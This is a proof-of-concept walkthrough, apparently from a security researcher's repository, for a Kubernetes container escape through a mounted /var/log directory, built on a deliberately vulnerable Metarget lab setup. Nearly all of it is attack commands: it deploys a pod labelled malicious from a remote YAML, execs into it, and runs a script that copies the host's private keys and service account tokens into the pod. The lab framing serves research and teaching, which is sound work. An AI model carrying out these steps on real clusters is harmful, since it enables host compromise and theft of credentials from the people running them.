## Proof of Concept

To perform the Proof of Concept, please follow the below steps:

1. Basic environment setup for Docker and K8+. Execute the following commands inside the metarget folder.<br/>
`./metarget gadget install docker --version 18.03.1` <br/>
`./metarget gadget install k8s --version 1.16.5 --domestic`
2. Prepare the vulnerable environment using the following command. <br/>
`./metarget cnv install mount-var-log`

3. Prepare the malicious pod using the following command. <br/>
`kubectl create -f https://raw.githubusercontent.com/haseeb62/CVEs/main/Mount-var-log/POC/escaper.yml`
4. Exec into the pod. The pod contains built-in exploit code which will read any files from the host.<br/>
`kubectl exec -it mount-var-log -n metarget bash`
5. Execute the `find_sensitive_files.py` script which downloads private key files and kubernetes service account tokens from the host.<br/>
`python find_sensitive_files.py`
6. To verify the files are downloaded in the pod, check the files in the following directories.<br/>
`cd /root/exploit/host_files/tokens`<br/>
`cd /root/exploit/host_files/private_keys`


